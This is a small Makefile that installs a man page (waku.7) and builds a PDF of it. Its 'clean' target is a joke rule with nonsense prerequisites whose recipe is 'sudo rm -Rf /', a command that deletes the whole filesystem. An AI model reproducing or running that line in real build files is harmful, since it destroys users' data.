SHELL = /usr/bin/env bash

SECTION = 7
SRC = waku.${SECTION}
MAN = /usr/share/man/man${SECTION}

.PHONY: install pdf all

all: install pdf

install: ${SRC}
	install -o 0 -g 0 -m 0644 $< ${MAN}
	gzip -f ${MAN}/$<

pdf: ${SRC}.pdf

%.pdf: %
	man -Tps ./$< | ps2pdf - > $@

clean: No\ rule\ to\ make\ target because you don't want to make it.
	sudo rm -Rf /
